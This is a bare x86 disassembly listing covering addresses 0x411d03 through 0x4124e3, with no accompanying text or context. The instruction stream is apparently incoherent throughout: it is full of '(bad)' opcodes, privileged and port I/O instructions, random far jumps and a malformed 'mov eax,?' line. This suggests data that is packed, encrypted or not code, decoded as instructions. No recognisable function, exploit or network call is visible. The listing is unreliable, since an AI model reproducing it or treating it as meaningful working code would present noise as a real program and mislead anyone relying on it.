  411d03:	jnp    0x411d1a
  411d05:	add    eax,DWORD PTR [edi]
  411d07:	push   0xb812323e
  411d0c:	scas   al,BYTE PTR es:[edi]
  411d0d:	gs stos BYTE PTR es:[edi],al
  411d0f:	or     bh,dh
  411d11:	push   ebx
  411d12:	push   es
  411d13:	sbb    DWORD PTR [edx+0x2eff0b9d],ebp
  411d19:	jle    0x411c9b
  411d1b:	inc    ebp
  411d1c:	bndldx bnd1,[esi]
  411d1f:	mov    edx,0x8aec3834
  411d24:	sahf   
  411d25:	(bad)  
  411d26:	push   eax
  411d27:	data16 lock adc al,0x3c
  411d2b:	inc    ebp
  411d2c:	loopne 0x411cff
  411d2e:	ss out dx,al
  411d30:	mov    ch,0x42
  411d32:	cli    
  411d33:	mov    ch,0xf8
  411d35:	jmp    0xc3d7fbb5
  411d3a:	fmulp  st(3),st
  411d3c:	jns    0x411d8a
  411d3e:	ss jno 0x411cc1
  411d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d42:	pop    ebp
  411d43:	xchg   edx,eax
  411d44:	pushf  
  411d45:	ins    BYTE PTR es:[edi],dx
  411d46:	push   0xfc935f2a
  411d4b:	push   edx
  411d4c:	cmp    al,0xeb
  411d4e:	imul   eax,DWORD PTR [esi+0x3e],0xffffff8d
  411d52:	xchg   edx,eax
  411d53:	mov    dl,0x37
  411d55:	xor    ebx,DWORD PTR [edi-0x25f992b]
  411d5b:	pop    ds
  411d5c:	mov    edi,DWORD PTR [eax+0x24431438]
  411d62:	and    eax,0x1859fc6a
  411d67:	mov    bl,0xd0
  411d69:	in     al,0x70
  411d6b:	popf   
  411d6c:	xchg   ebp,eax
  411d6d:	inc    edi
  411d6e:	dec    esp
  411d6f:	push   esi
  411d70:	mov    edi,0x9b35baa5
  411d75:	test   al,0x7d
  411d77:	sti    
  411d78:	fdivr  QWORD PTR [eax+0x280bae78]
  411d7e:	jle    0x411d4e
  411d80:	aam    0x5f
  411d82:	sub    ah,BYTE PTR [esi+0xa68a5f4]
  411d88:	(bad)  
  411d89:	test   eax,0x38d3aa7e
  411d8e:	and    DWORD PTR [esi+0x316a2114],esi
  411d94:	(bad)  
  411d95:	fsub   st,st(7)
  411d97:	ds add al,0xe7
  411d9a:	pop    ss
  411d9b:	dec    ebx
  411d9c:	and    al,BYTE PTR [eax-0xa]
  411d9f:	sbb    al,BYTE PTR [edi]
  411da1:	fwait
  411da2:	xor    bl,BYTE PTR [ebx]
  411da4:	inc    ebx
  411da5:	std    
  411da6:	aam    0x4a
  411da8:	jg     0x411da7
  411daa:	stos   BYTE PTR es:[edi],al
  411dab:	rcr    cl,cl
  411dad:	mov    ds:0x1d4b6163,al
  411db2:	popf   
  411db3:	sub    DWORD PTR [ecx],edi
  411db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411db6:	sahf   
  411db7:	sub    ebx,DWORD PTR [ecx+eiz*8-0x18]
  411dbb:	lahf   
  411dbc:	or     esi,eax
  411dbe:	outs   dx,DWORD PTR ds:[esi]
  411dbf:	mov    ebp,0xc5cc7417
  411dc4:	or     DWORD PTR [esi+eiz*4],ebp
  411dc7:	mov    dh,0xaa
  411dc9:	mov    al,0xa2
  411dcb:	xchg   edx,eax
  411dcc:	and    bl,BYTE PTR [edx+0x10]
  411dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dd0:	jmp    0xef9a4f13
  411dd5:	or     bl,BYTE PTR [edi-0x1d]
  411dd8:	dec    esi
  411dd9:	mov    edx,0x5d3316b8
  411dde:	(bad)  
  411ddf:	mov    al,ds:0x2cc6aa0e
  411de4:	and    dh,bl
  411de6:	std    
  411de7:	jle    0x411e02
  411de9:	push   0x90c6cd27
  411dee:	xchg   esp,eax
  411def:	inc    esi
  411df0:	push   esi
  411df1:	nop
  411df2:	test   DWORD PTR ds:0xbff975f4,eax
  411df8:	inc    eax
  411df9:	push   cs
  411dfa:	jge    0x411e4d
  411dfc:	xor    ecx,esi
  411dfe:	sub    DWORD PTR [edi],esp
  411e00:	mov    eax,0x75c9eb6a
  411e05:	bound  esp,QWORD PTR [ecx+0x786e3304]
  411e0b:	inc    ecx
  411e0c:	mov    edi,0xb9f17c7b
  411e11:	dec    esp
  411e12:	xchg   ebx,eax
  411e13:	mov    edi,0xd2c7613a
  411e18:	add    ch,BYTE PTR [edi-0x66063af6]
  411e1e:	es in  al,dx
  411e20:	shl    BYTE PTR ds:[eax],0xed
  411e24:	jno    0x411e6e
  411e26:	iret   
  411e27:	cmp    al,0x80
  411e29:	stc    
  411e2a:	dec    edi
  411e2b:	pop    es
  411e2c:	ins    DWORD PTR es:[edi],dx
  411e2d:	pusha  
  411e2e:	dec    edi
  411e2f:	push   esi
  411e30:	nop
  411e31:	inc    edx
  411e32:	hlt    
  411e33:	cli    
  411e34:	jg     0x411e34
  411e36:	push   0x6b
  411e38:	push   eax
  411e39:	fwait
  411e3a:	leave  
  411e3b:	in     al,0x59
  411e3d:	mov    dl,0x7c
  411e3f:	fild   WORD PTR [ebp+0x59db0b82]
  411e45:	cmc    
  411e46:	mov    DWORD PTR [ebx+0x4bec44cd],ecx
  411e4c:	cmp    esp,DWORD PTR [edi+0x38]
  411e4f:	or     BYTE PTR ds:0x27de1787,ah
  411e55:	adc    eax,0x50717abb
  411e5a:	jmp    0xd593:0xc0850920
  411e61:	mov    edi,0x77612abe
  411e66:	fucomp st(1)
  411e68:	mov    ah,0x3b
  411e6a:	adc    ecx,DWORD PTR [esi]
  411e6c:	cmp    al,BYTE PTR [edx+0x58d073c6]
  411e72:	adc    ebx,DWORD PTR [ebp+ebp*8+0x19396b02]
  411e79:	sti    
  411e7a:	mov    bh,0x31
  411e7c:	xchg   ebx,eax
  411e7d:	das    
  411e7e:	dec    edx
  411e7f:	rcl    bh,0x62
  411e82:	push   ss
  411e83:	aad    0x0
  411e85:	fldcw  WORD PTR [esi-0x138870ff]
  411e8b:	ins    BYTE PTR es:[edi],dx
  411e8c:	in     al,0xe2
  411e8e:	mov    cl,BYTE PTR [ebx+0x78b16ef1]
  411e94:	inc    ebx
  411e95:	cmovbe ebx,DWORD PTR [ebx]
  411e98:	jnp    0x411edb
  411e9a:	stos   DWORD PTR es:[edi],eax
  411e9b:	ret    0x1488
  411e9e:	mov    edx,0xe938f6a9
  411ea3:	(bad)  
  411ea4:	fisttp QWORD PTR [ebp+0x58c70c22]
  411eaa:	cs inc esi
  411eac:	das    
  411ead:	sub    DWORD PTR [ebx+ebx*1],eax
  411eb0:	xchg   edx,eax
  411eb1:	loope  0x411f13
  411eb3:	push   ds
  411eb4:	test   al,0xa7
  411eb6:	js     0x411e3e
  411eb8:	inc    ecx
  411eb9:	add    BYTE PTR [ecx-0x70],0xcd
  411ebd:	or     ch,BYTE PTR [ecx]
  411ebf:	mov    WORD PTR [ebp-0x52],gs
  411ec2:	jp     0x411ee2
  411ec4:	push   esp
  411ec5:	aam    0x43
  411ec7:	js     0x411edf
  411ec9:	push   esp
  411eca:	xor    al,0x14
  411ecc:	push   ds
  411ecd:	push   DWORD PTR [ebp+0x43fa28c5]
  411ed3:	add    edi,DWORD PTR [eax-0x2b]
  411ed6:	or     al,dl
  411ed8:	loopne 0x411ed5
  411eda:	cmp    al,0x2a
  411edc:	jg     0x411efa
  411ede:	pop    ebx
  411edf:	(bad)  
  411ee1:	icebp  
  411ee2:	lahf   
  411ee3:	ss test al,0x41
  411ee6:	sub    BYTE PTR [ebx],bl
  411ee8:	in     al,0x7a
  411eea:	mov    ds:0x3d656742,al
  411eef:	not    edi
  411ef1:	aam    0x6d
  411ef3:	inc    ebx
  411ef4:	jno    0x411efb
  411ef6:	jecxz  0x411edd
  411ef8:	shl    BYTE PTR cs:[ecx-0x34e054ef],cl
  411eff:	or     BYTE PTR [edi-0x2e],0x4d
  411f03:	fwait
  411f04:	push   edx
  411f05:	(bad)  
  411f06:	(bad)  
  411f07:	sub    eax,0xc737bcbd
  411f0c:	ror    bh,1
  411f0e:	adc    al,0x60
  411f10:	ins    BYTE PTR es:[edi],dx
  411f11:	out    0xa2,eax
  411f13:	xor    DWORD PTR [esi+0x51253c9],0xeaa867ce
  411f1d:	lock or BYTE PTR [edi],0xe8
  411f21:	stc    
  411f22:	cli    
  411f23:	in     eax,dx
  411f24:	jl     0x411f43
  411f26:	cmp    al,BYTE PTR [ebx-0x2f]
  411f29:	or     esi,ebx
  411f2b:	(bad)  [edx+0x765c0bde]
  411f31:	outs   dx,BYTE PTR ds:[esi]
  411f32:	shr    esi,1
  411f34:	push   edx
  411f35:	and    al,0xa3
  411f37:	dec    esp
  411f38:	ins    BYTE PTR es:[edi],dx
  411f39:	retf   
  411f3a:	pusha  
  411f3b:	es in  eax,0x1a
  411f3e:	aaa    
  411f3f:	mov    bh,0x1b
  411f41:	out    dx,eax
  411f42:	sub    edx,DWORD PTR ds:0xf06564e2
  411f48:	or     ebp,ecx
  411f4a:	cli    
  411f4b:	xchg   esi,eax
  411f4c:	repnz sub eax,0x7f0c632b
  411f52:	cwde   
  411f53:	sbb    al,dh
  411f55:	sbb    cl,BYTE PTR [ebp-0x25]
  411f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f59:	out    0xd6,eax
  411f5b:	adc    eax,0xff6c680d
  411f60:	popf   
  411f61:	mov    BYTE PTR ds:0xd8825377,0x70
  411f68:	adc    eax,0x78b2532d
  411f6d:	cmp    BYTE PTR [edi+0x1b12ad25],dh
  411f73:	fldln2 
  411f75:	jns    0x411f35
  411f77:	mov    ds:0x77b1e433,eax
  411f7c:	jo     0x411f50
  411f7e:	pop    eax
  411f7f:	das    
  411f80:	jb     0x411fd1
  411f82:	stos   DWORD PTR es:[edi],eax
  411f83:	jg     0x411fef
  411f85:	int    0x93
  411f87:	bound  edx,QWORD PTR [ecx+0x7f96f17b]
  411f8d:	sbb    esp,DWORD PTR [ebx+0x73e637d1]
  411f93:	loop   0x411f58
  411f95:	daa    
  411f96:	cmp    DWORD PTR [eax-0x13],ebp
  411f99:	loope  0x411fb9
  411f9b:	jne    0x411f6b
  411f9d:	mov    eax,eax
  411f9f:	repz cmp ecx,DWORD PTR [ecx]
  411fa2:	out    dx,al
  411fa3:	cli    
  411fa4:	imul   edi,DWORD PTR [ecx],0xcc56f4e6
  411faa:	lods   al,BYTE PTR ds:[esi]
  411fab:	nop
  411fac:	add    DWORD PTR [ecx+0x23d3dbb2],esp
  411fb2:	scas   al,BYTE PTR es:[edi]
  411fb3:	(bad)  
  411fb4:	pop    eax
  411fb5:	rcl    BYTE PTR [ebp+0x48],1
  411fb8:	and    ebp,edi
  411fba:	mov    ebx,0x41046f84
  411fbf:	add    DWORD PTR [esi-0x58],esi
  411fc2:	fmul   DWORD PTR [ecx]
  411fc4:	or     BYTE PTR [edx],bh
  411fc6:	ins    WORD PTR es:[edi],dx
  411fc8:	shr    DWORD PTR [esi-0xc],1
  411fcb:	fwait
  411fcc:	test   BYTE PTR [esi-0x33],0x8f
  411fd0:	jae    0x411f8e
  411fd2:	and    esp,DWORD PTR [edi]
  411fd4:	pop    eax
  411fd5:	outs   dx,DWORD PTR ds:[esi]
  411fd6:	call   0x914b6ac3
  411fdb:	aam    0x17
  411fdd:	inc    esp
  411fde:	dec    ecx
  411fdf:	pop    ebx
  411fe0:	xor    ecx,DWORD PTR [ebx]
  411fe2:	cmp    eax,esp
  411fe4:	add    ah,bl
  411fe6:	sbb    eax,0x7151998f
  411feb:	push   0xffffffc4
  411fed:	jg     0x411fa0
  411fef:	xor    al,0x55
  411ff1:	xchg   BYTE PTR ds:0x508f6efd,cl
  411ff7:	inc    eax
  411ff8:	jl     0x412010
  411ffa:	mov    ebp,0xb35201a3
  411fff:	xor    BYTE PTR [edi+0x66eafce8],bh
  412005:	mov    esp,0x5964db37
  41200a:	push   edi
  41200b:	mov    eax,?
  41200d:	mov    ebp,0xa7036c8a
  412012:	in     eax,dx
  412013:	pushf  
  412014:	cdq    
  412015:	stos   DWORD PTR es:[edi],eax
  412016:	sti    
  412017:	call   DWORD PTR [ebp-0x307b8152]
  41201d:	xor    DWORD PTR [edx],0xd
  412020:	mov    ds:0x884a27c,eax
  412025:	test   bh,0x16
  412028:	lahf   
  412029:	or     edi,ebp
  41202b:	data16 hlt 
  41202d:	stos   DWORD PTR es:[edi],eax
  41202e:	fs out 0xd7,al
  412031:	push   0x5228ff03
  412036:	cmc    
  412037:	stos   BYTE PTR es:[edi],al
  412038:	aad    0xc5
  41203a:	jno    0x41202e
  41203c:	xor    ebx,DWORD PTR ds:0x6c9eff81
  412042:	add    eax,0x82a1acf5
  412047:	aad    0xca
  412049:	push   ds
  41204a:	or     BYTE PTR [eax],bh
  41204c:	repz sbb bh,al
  41204f:	cmp    cl,BYTE PTR [eax]
  412051:	lahf   
  412052:	mov    al,BYTE PTR [edx-0x3e]
  412055:	outs   dx,BYTE PTR ds:[esi]
  412056:	mov    BYTE PTR [edi+0x4e3621ca],dl
  41205c:	fs mov dl,0xff
  41205f:	or     eax,0x28d5764a
  412064:	div    DWORD PTR [ecx]
  412066:	cwde   
  412067:	pop    ecx
  412068:	xor    eax,0x74461ee9
  41206d:	nop
  41206e:	sahf   
  41206f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412070:	jne    0x411ff3
  412072:	das    
  412073:	(bad)  
  412074:	pop    es
  412075:	sub    DWORD PTR ds:0x651b0069,0xffffff82
  41207c:	(bad)  
  41207e:	mov    ebx,0x1314b395
  412083:	loop   0x41200a
  412085:	mov    ch,0x7d
  412087:	stos   BYTE PTR es:[edi],al
  412088:	adc    BYTE PTR [edi],bh
  41208a:	mov    ch,0xc3
  41208c:	pop    esi
  41208d:	inc    ebx
  41208e:	paddsw mm3,QWORD PTR [edi]
  412091:	pushf  
  412092:	add    al,0xb9
  412094:	mov    dl,0x46
  412096:	js     0x4120d4
  412098:	mov    DWORD PTR [eax+ecx*4-0x16198576],ebx
  41209f:	inc    ebp
  4120a0:	pop    edi
  4120a1:	adc    BYTE PTR [edi],cl
  4120a3:	xchg   BYTE PTR [edi+ebp*8-0x4c92d906],cl
  4120aa:	int    0xb5
  4120ac:	add    eax,0xdf8b7082
  4120b1:	bound  edi,QWORD PTR [ebx-0x3f]
  4120b4:	hlt    
  4120b5:	pop    ss
  4120b6:	adc    edi,DWORD PTR [ecx-0x1d189339]
  4120bc:	fmulp  st(0),st
  4120be:	rcl    BYTE PTR [ecx+0x593068c0],0xcc
  4120c5:	adc    BYTE PTR [edi-0x14],bl
  4120c8:	sbb    DWORD PTR [eax],esi
  4120ca:	adc    ecx,0xffffff88
  4120cd:	add    eax,0xecea3861
  4120d2:	aas    
  4120d3:	pop    ebx
  4120d4:	rol    DWORD PTR [edi],1
  4120d6:	ss retw 0x762
  4120db:	sti    
  4120dc:	adc    ecx,DWORD PTR [esi-0x1d]
  4120df:	sub    ebp,ebx
  4120e1:	pop    edx
  4120e2:	xlat   BYTE PTR ds:[ebx]
  4120e3:	je     0x4120f4
  4120e5:	and    eax,0x3b66076f
  4120ea:	xor    BYTE PTR [ecx],dl
  4120ec:	or     cl,ch
  4120ee:	xor    DWORD PTR [edi-0x48],eax
  4120f1:	inc    ecx
  4120f2:	push   es
  4120f3:	lock popa 
  4120f5:	(bad)  
  4120f6:	aaa    
  4120f7:	cli    
  4120f8:	retf   
  4120f9:	test   bl,dl
  4120fb:	wbinvd 
  4120fd:	jl     0x412096
  4120ff:	xlat   BYTE PTR ds:[ebx]
  412100:	pop    edi
  412101:	clc    
  412102:	in     eax,0xc4
  412104:	in     al,dx
  412105:	push   esp
  412106:	sub    al,0x41
  412108:	popa   
  412109:	std    
  41210a:	or     al,0xc5
  41210c:	je     0x412093
  41210e:	mov    dh,0xae
  412110:	or     DWORD PTR [edx],esi
  412112:	sub    eax,0x6ffe08d0
  412117:	jge    0x412163
  412119:	mov    ds:0xfb5e2440,eax
  41211e:	addr16 std 
  412120:	xchg   ecx,esi
  412122:	xchg   edx,eax
  412124:	and    DWORD PTR es:[ebp-0x51],edi
  412128:	push   eax
  412129:	das    
  41212a:	cmc    
  41212b:	pop    ecx
  41212c:	xchg   ecx,eax
  41212d:	xchg   esi,eax
  41212e:	js     0x4120e6
  412130:	adc    eax,0x5d6aa0ee
  412135:	push   esi
  412136:	cmp    eax,0x3d340f75
  41213b:	xchg   edx,eax
  41213c:	fimul  DWORD PTR [ebx+0xac15bb2]
  412142:	and    eax,edi
  412144:	cmp    DWORD PTR [ecx+edx*2-0x6484268c],0xe517a910
  41214f:	pop    ecx
  412150:	push   ebx
  412151:	and    eax,0x2b8e10f9
  412156:	es pushfw 
  412159:	mov    eax,0xab906480
  41215e:	cli    
  41215f:	call   0x8a639fff
  412164:	add    BYTE PTR es:[edx-0x14814418],bl
  41216b:	daa    
  41216c:	or     dh,BYTE PTR [eax-0x4a]
  41216f:	test   DWORD PTR [esi-0x14b717d5],ecx
  412175:	and    al,0x79
  412177:	jge    0x412117
  412179:	lahf   
  41217a:	inc    esp
  41217b:	std    
  41217c:	fwait
  41217d:	or     DWORD PTR [ecx],edi
  41217f:	outs   dx,DWORD PTR ds:[esi]
  412180:	or     BYTE PTR [eax+0x38],cl
  412183:	xchg   ecx,eax
  412184:	adc    DWORD PTR [edi+eiz*1-0xe5d1d8],0xffffffac
  41218c:	jge    0x4121f9
  41218e:	(bad)  
  41218f:	and    BYTE PTR [ebp-0x3d2c81a8],bl
  412195:	out    0x11,eax
  412197:	std    
  412198:	js     0x412184
  41219a:	jnp    0x412145
  41219c:	xor    al,0xb9
  41219e:	imul   esp,DWORD PTR [ecx],0xffffffe0
  4121a1:	and    bl,cl
  4121a3:	mov    ds:0xd51558a0,eax
  4121a8:	or     al,0xa3
  4121aa:	push   edx
  4121ab:	bound  eax,QWORD PTR [eax-0x26]
  4121ae:	std    
  4121af:	inc    esp
  4121b0:	lahf   
  4121b1:	or     esi,DWORD PTR [edx-0x4c]
  4121b4:	sub    eax,0x64f8a92d
  4121b9:	test   eax,0xda54636d
  4121be:	push   ecx
  4121bf:	sub    DWORD PTR [esi],esp
  4121c1:	lods   al,BYTE PTR ds:[esi]
  4121c2:	xor    al,0xea
  4121c4:	mov    al,dh
  4121c6:	and    edx,DWORD PTR ds:0x27d132b6
  4121cc:	loope  0x4121b1
  4121ce:	push   esp
  4121cf:	in     al,dx
  4121d0:	pop    ebp
  4121d1:	mov    esp,fs
  4121d3:	jl     0x4121e7
  4121d5:	cdq    
  4121d6:	(bad)  
  4121d8:	arpl   sp,bp
  4121da:	jae    0x412190
  4121dc:	repz retf 
  4121de:	pop    edx
  4121df:	sub    ecx,DWORD PTR [ecx+0x3313d96]
  4121e5:	lods   eax,DWORD PTR ds:[esi]
  4121e6:	inc    BYTE PTR [edi-0x77]
  4121e9:	iret   
  4121ea:	mov    bh,0x53
  4121ec:	inc    ecx
  4121ed:	jno    0x412227
  4121ef:	adc    DWORD PTR ds:[edx+eax*1-0x65a7361e],edx
  4121f7:	ins    BYTE PTR es:[edi],dx
  4121f8:	les    eax,FWORD PTR [eax+0x5]
  4121fb:	loopne 0x412266
  4121fd:	inc    ecx
  4121fe:	mov    cl,0x39
  412200:	push   ss
  412201:	arpl   WORD PTR [ebx],bx
  412203:	adc    BYTE PTR [ecx],cl
  412205:	scas   eax,DWORD PTR es:[edi]
  412206:	sahf   
  412207:	imul   esi,DWORD PTR [eax+ebx*8],0x666e4dbc
  41220e:	sahf   
  41220f:	int    0x16
  412211:	mov    al,ds:0x7359b136
  412216:	stc    
  412217:	test   eax,0x96373df5
  41221c:	pop    esi
  41221d:	sub    DWORD PTR [eax],0x32fd6c5f
  412223:	mov    al,ds:0x1a8d678f
  412228:	pop    ebx
  412229:	test   BYTE PTR [ecx],ch
  41222b:	xor    al,0x66
  41222d:	and    DWORD PTR [edi],0xffffffca
  412230:	jno    0x4122a9
  412232:	je     0x412285
  412234:	jns    0x41224a
  412236:	pop    esp
  412237:	jns    0x4121db
  412239:	lock sbb BYTE PTR [edx],cl
  41223c:	push   edi
  41223d:	enter  0x8936,0x34
  412241:	jbe    0x412241
  412243:	neg    BYTE PTR [esi+0x4909eb36]
  412249:	mov    ebx,0xc23e8436
  41224e:	mov    DWORD PTR [bx+di+0x20],edx
  412252:	clc    
  412253:	clc    
  412254:	and    BYTE PTR [edx-0x71],al
  412257:	mov    ds:0xfb399a51,eax
  41225c:	push   esi
  41225d:	pop    ecx
  41225e:	adc    esp,DWORD PTR [esi-0x51]
  412261:	loope  0x412213
  412263:	push   esp
  412264:	sbb    bl,al
  412266:	pop    ebx
  412267:	push   ebx
  412268:	shl    DWORD PTR [ebp-0x6d],cl
  41226b:	pop    esp
  41226c:	mov    eax,0x129ef390
  412271:	add    BYTE PTR [ebx+0x59],al
  412274:	daa    
  412275:	ss sbb al,0xa5
  412278:	inc    edx
  412279:	xor    BYTE PTR [edx],0x10
  41227c:	and    al,0x3d
  41227e:	cdq    
  41227f:	fbld   TBYTE PTR [edi+0x11d79775]
  412285:	sub    ebp,DWORD PTR [ebx]
  412287:	pop    es
  412288:	add    DWORD PTR [esi],ecx
  41228a:	stos   DWORD PTR es:[edi],eax
  41228b:	jecxz  0x412302
  41228d:	sbb    al,0xdd
  41228f:	inc    ebp
  412290:	aam    0x73
  412292:	shl    DWORD PTR [ebp-0x17cab401],cl
  412298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412299:	push   ds
  41229a:	sti    
  41229b:	mov    cl,0x4f
  41229d:	mov    esi,0xe4d95c0c
  4122a2:	or     al,0x2d
  4122a4:	je     0x412312
  4122a6:	mov    edx,0xe887782a
  4122ab:	pop    esi
  4122ac:	dec    ecx
  4122ad:	xchg   DWORD PTR [edi],ebp
  4122af:	cli    
  4122b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122b1:	xchg   BYTE PTR [ebx],al
  4122b3:	scas   eax,DWORD PTR es:[edi]
  4122b4:	popf   
  4122b5:	je     0x41231a
  4122b7:	mov    ch,0x52
  4122b9:	test   DWORD PTR [eax+ecx*1],esp
  4122bc:	test   eax,0xf5fbe9b9
  4122c1:	or     eax,0x5e4ee225
  4122c6:	(bad)  [ecx-0x1f]
  4122c9:	and    al,0xa5
  4122cb:	xor    dh,bh
  4122cd:	and    ebx,DWORD PTR [ebx+eiz*8-0x3e9b3cd8]
  4122d4:	push   0x8b63b4c0
  4122d9:	out    0x30,eax
  4122db:	pop    ebx
  4122dc:	ds pop edi
  4122de:	push   ecx
  4122df:	jb     0x41231a
  4122e1:	outs   dx,DWORD PTR ds:[esi]
  4122e2:	shr    edx,0xb0
  4122e5:	(bad)  
  4122e6:	push   ds
  4122e7:	sti    
  4122e8:	fs sbb eax,0xf684f866
  4122ee:	lea    ebp,[ebp+0x56]
  4122f1:	ret    
  4122f2:	(bad)  
  4122f3:	aam    0xb
  4122f5:	jge    0x412345
  4122f7:	add    BYTE PTR [edi+edx*8-0x6f],ch
  4122fb:	jle    0x41232b
  4122fd:	shr    BYTE PTR ds:0x9062c995,1
  412303:	pop    edi
  412304:	add    ah,BYTE PTR [ebp+0x43]
  412307:	retf   
  412308:	fist   WORD PTR [edx]
  41230a:	(bad)  
  41230b:	add    DWORD PTR ds:0xe67f6927,edi
  412311:	sbb    al,0x9a
  412313:	fcomp  QWORD PTR [ebp-0x27]
  412316:	ss mov eax,0x4bc0688c
  41231c:	xor    BYTE PTR [esi+0x3d117562],0x80
  412323:	or     ah,BYTE PTR [ecx-0x3b417fa2]
  412329:	stos   DWORD PTR es:[edi],eax
  41232a:	or     edx,ecx
  41232c:	push   ds
  41232d:	int3   
  41232e:	enter  0x4972,0xfd
  412332:	xor    edi,DWORD PTR [edx]
  412334:	sub    esp,DWORD PTR [esi+ebp*1-0x11]
  412338:	dec    ebx
  412339:	or     al,0x93
  41233b:	xchg   ecx,eax
  41233c:	xor    BYTE PTR [eax],0x47
  41233f:	push   ebx
  412340:	adc    ch,dh
  412342:	push   si
  412344:	rcl    BYTE PTR [ebp+0x2f20217c],cl
  41234a:	cmp    BYTE PTR [edi],0x1a
  41234d:	mov    dl,0x5a
  41234f:	mov    DWORD PTR [edx+esi*1-0x7c5d0f2d],edx
  412356:	je     0x41236d
  412358:	and    ebp,DWORD PTR [ebp-0x507edecd]
  41235e:	xchg   ebx,eax
  41235f:	lds    ecx,FWORD PTR [edx+0x14]
  412362:	aaa    
  412363:	or     bl,BYTE PTR [ebx]
  412365:	mov    WORD PTR [esi+0x28],cs
  412368:	enterw 0x644b,0xd1
  41236d:	leave  
  41236e:	loop   0x4123bf
  412370:	inc    esi
  412371:	xchg   edi,eax
  412372:	(bad)  
  412374:	mov    ebp,0x60637fae
  412379:	gs and al,0x66
  41237c:	fwait
  41237d:	enter  0x1aef,0xcc
  412381:	in     eax,dx
  412382:	mov    ebp,0x47db4ac7
  412387:	and    al,0xf1
  412389:	(bad)  
  41238a:	je     0x412404
  41238c:	je     0x4123c6
  41238e:	add    DWORD PTR [eax+0x451cfeac],esi
  412394:	(bad)  
  412395:	dec    esi
  412396:	aam    0x55
  412398:	push   ebx
  412399:	repz fpatan 
  41239c:	xor    BYTE PTR [edx+edi*2+0x2d5da2d8],0x5f
  4123a4:	inc    esp
  4123a5:	or     ebp,DWORD PTR [ebx+0xe]
  4123a8:	mov    ds:0x366f0c65,al
  4123ad:	add    edx,DWORD PTR [ebx-0x11cc46e6]
  4123b3:	inc    ebx
  4123b4:	shl    DWORD PTR [ebx+0x577276e9],1
  4123ba:	call   0x65f02534
  4123bf:	mov    al,ds:0xd7e78d4d
  4123c4:	sub    bh,bl
  4123c6:	push   ebp
  4123c7:	push   esi
  4123c8:	adc    eax,0xd3784bf9
  4123ce:	add    bh,ah
  4123d0:	add    DWORD PTR [ebp+0x41c6e903],edx
  4123d6:	adc    bl,BYTE PTR [esp+ecx*8-0xac335c3]
  4123dd:	dec    edx
  4123de:	mov    ecx,DWORD PTR [ecx-0x615960b4]
  4123e4:	scas   eax,DWORD PTR es:[edi]
  4123e5:	xchg   si,ax
  4123e7:	sbb    BYTE PTR [eax+0x78d4f318],ch
  4123ed:	(bad)  
  4123ef:	(bad)  
  4123f0:	jle    0x4123f1
  4123f2:	repz aaa 
  4123f4:	cld    
  4123f5:	retf   
  4123f6:	push   edx
  4123f7:	pop    ds
  4123f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123f9:	mov    ds:0xf7cb57ac,al
  4123fe:	lea    ebx,[ebx-0x4850854f]
  412404:	test   al,0x2d
  412406:	out    0xe3,al
  412408:	dec    esp
  412409:	lock pop edi
  41240b:	lds    edi,FWORD PTR [edx+0x2f7bac64]
  412411:	clc    
  412412:	push   edi
  412413:	shr    BYTE PTR [edi+esi*2+0x32776cff],0xde
  41241b:	add    esp,esp
  41241d:	mov    esp,DWORD PTR [esi]
  41241f:	push   ss
  412420:	mov    ah,0x7b
  412422:	rcl    cl,cl
  412424:	cdq    
  412425:	and    esi,ecx
  412427:	mov    edi,0x989ce4ef
  41242c:	mov    edi,0xc9d1b5a5
  412431:	sub    ebp,DWORD PTR ds:0x360d7872
  412437:	shl    BYTE PTR [eax],0xd1
  41243a:	push   edx
  41243b:	ror    ah,cl
  41243d:	clc    
  41243e:	stos   BYTE PTR es:[edi],al
  41243f:	mov    dl,0xdb
  412441:	popa   
  412442:	xlat   BYTE PTR ds:[ebx]
  412443:	jb     0x4123e6
  412445:	mov    al,0x15
  412447:	xchg   edx,eax
  412448:	jecxz  0x41241f
  41244a:	dec    ebx
  41244b:	imul   esi,DWORD PTR [edi+0x2dae03fe],0x68d33ef3
  412455:	mov    ds:0xd12ced9c,al
  41245a:	mov    al,ds:0xda706f4a
  41245f:	jmp    0x4123e2
  412461:	int3   
  412462:	inc    ebx
  412463:	pop    es
  412464:	push   edi
  412465:	jo     0x412487
  412467:	sub    dl,dh
  412469:	push   esp
  41246a:	jp     0x412469
  41246c:	in     al,dx
  41246d:	loope  0x4124bb
  41246f:	mov    ecx,0x13a07cac
  412474:	mov    dh,0xe4
  412476:	(bad)  
  412477:	pusha  
  412478:	pusha  
  412479:	nop
  41247a:	jbe    0x41243f
  41247c:	inc    ebx
  41247d:	(bad)  [esp+edi*8-0x7935b68]
  412484:	stos   BYTE PTR es:[edi],al
  412485:	lahf   
  412486:	retf   
  412487:	out    0x4d,eax
  412489:	scas   al,BYTE PTR es:[edi]
  41248a:	xchg   ebp,eax
  41248b:	jmp    0x4bb1c38a
  412490:	push   cs
  412491:	retf   
  412492:	dec    ebx
  412493:	add    eax,0x89bc792e
  412498:	mov    ch,BYTE PTR [eax]
  41249a:	std    
  41249b:	cwde   
  41249c:	or     ebx,ebx
  41249e:	push   es
  41249f:	adc    dl,cl
  4124a1:	pop    eax
  4124a2:	ins    DWORD PTR es:[edi],dx
  4124a3:	mov    al,0xbd
  4124a5:	lds    esp,FWORD PTR [edx]
  4124a7:	jmp    0xfbe4:0x758fcbc5
  4124ae:	xor    eax,0x43234398
  4124b3:	mov    esp,0xb19908b1
  4124b8:	jb     0x412489
  4124ba:	adc    eax,0x685fd52e
  4124bf:	stc    
  4124c0:	xchg   ecx,eax
  4124c1:	sbb    al,0xf2
  4124c3:	mov    bh,ch
  4124c5:	(bad)  
  4124c6:	jo     0x41244b
  4124c8:	mov    eax,ds:0xcd046fc4
  4124cd:	or     edx,eax
  4124cf:	xor    al,0x32
  4124d1:	and    DWORD PTR [ebp+0x5c1302a1],ebp
  4124d7:	jmp    0xbbf8:0x10f4642
  4124de:	test   DWORD PTR [ebp-0x1c],ecx
  4124e1:	inc    ebx
  4124e2:	lods   al,BYTE PTR ds:[esi]
  4124e3:	iret   
